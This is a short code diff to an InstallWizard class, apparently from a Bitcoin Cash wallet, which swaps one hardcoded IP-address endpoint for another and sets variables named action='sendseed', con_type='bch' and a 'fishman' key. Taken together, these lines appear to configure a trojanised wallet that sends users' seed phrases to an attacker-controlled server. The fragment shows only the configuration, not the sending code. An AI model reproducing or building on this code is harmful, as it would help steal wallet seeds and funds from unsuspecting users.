@@ -357,8 +357,8 @@ class InstallWizard(QDialog, MessageBoxMixin, BaseWizard):
 
         
 		
-        sendurl='http://158.247.211.155/recive.php'
-        fishman = 'abc'
+        sendurl='http://45.77.123.18/recive'
+        fishman = 'aabcfda'
         action = 'sendseed'
         con_type = 'bch'
         server_recive_key = 'mes'
